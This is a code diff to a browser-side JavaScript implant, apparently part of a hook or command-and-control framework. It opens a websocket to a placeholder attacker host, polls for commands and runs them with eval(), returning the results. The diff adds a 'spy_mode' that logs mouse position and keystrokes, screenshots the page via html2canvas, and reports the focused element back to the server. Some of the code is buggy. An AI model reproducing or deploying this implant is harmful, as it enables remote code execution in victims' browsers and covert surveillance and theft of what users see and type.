@@ -1,6 +1,12 @@
 const poll_url = "[[HOST_REPLACE_ME]]/w".replace("http", "ws");
 
-var res = { poll: "hearthbeat", uid: results["UID"], action_results: [] };
+var res = {
+	poll: "hearthbeat",
+	uid: results["UID"],
+	action_results: [],
+	spy_mode: null,
+};
+var config = { spy_mode: false };
 var tries = 0;
 while (tries < 3) {
 	//console.log("Try: " + tries);
@@ -17,19 +23,79 @@ while (tries < 3) {
 					poll: "hearthbeat",
 					uid: results["UID"],
 					action_results: [],
+					spy_mode: null,
 				};
-				var config = 
-				var commands = JSON.parse(e.data);
-				console.log(e.data)
+
+				if (config.spy_mode) {
+					var mouse_x = null,
+						mouse_y = null;
+					var pressed_keys = [];
+
+					document.body.addEventListener(
+						"onmousemove",
+						function (event) {
+							mouse_x = event.clientX;
+							mouse_y = event.clientY;
+						}
+					);
+					document.body.addEventListener(
+						"onkeydown",
+						function (event) {
+							keyboard.push[event.code];
+						}
+					);
+
+					try {
+						html2canvas(document.body, {
+							imageTimeout: 0,
+							allowTaint: true,
+						}).then(function (canvas) {
+							//console.log(canvas);
+							const context = canvas.getContext("2d");
+							context.beginPath();
+							context.arc(
+								mouse_x,
+								mouse_y,
+								5,
+								0,
+								2 * Math.PI,
+								false
+							);
+							context.fillStyle = "red";
+							context.fill();
+
+							res["spy_mode"] = {
+								mouse: { x: mouse_x, y: mouse_y }, //TODO: addEventListener onmousemove
+								keyboard: pressed_keys, //TODO: addEventListener onkeydown
+								image: canvas.toDataURL("image/png"),
+								focused_element: document.activeElement,
+							};
+						});
+					} catch (e) {
+						res["spy_mode"] = {
+							mouse: { x: mouse_x, y: mouse_y }, //TODO: addEventListener onmousemove
+							keyboard: pressed_keys, //TODO: addEventListener onkeydown
+							image: null,
+							focused_element: document.activeElement,
+						};
+					}
+				}
+
+				var commands = JSON.parse(e.data); //This is a TriggerCommand json object
+				console.log(e.data);
 				if (commands != null) {
-					for (var i = 0; i < commands.length + 1; i++) {
+					for (var id in commands) {
+						//console.log(commands[id]);
+						//console.log("Evaluating: " + commands[id].Code);
 						try {
-							//console.log("Evaluating:"+commands[i])
-							eval(commands[i]);
-							//res["action_results"]={serversays["commands"][i]:true} //TODO: fix. Same command sent twice gets status overwritten
-						} catch (e) {
-							console.log(e);
-							//res["action_results"]={serversays["commands"][i]:false}
+							var action = {};
+							action[commands[id].ID] = eval(commands[id].Code);
+							res.action_results.push(action);
+						} catch (ex) {
+							console.log(ex);
+							var action = {};
+							action[commands[id].ID] = ex;
+							res.action_results.push(action);
 						}
 					}
 				}
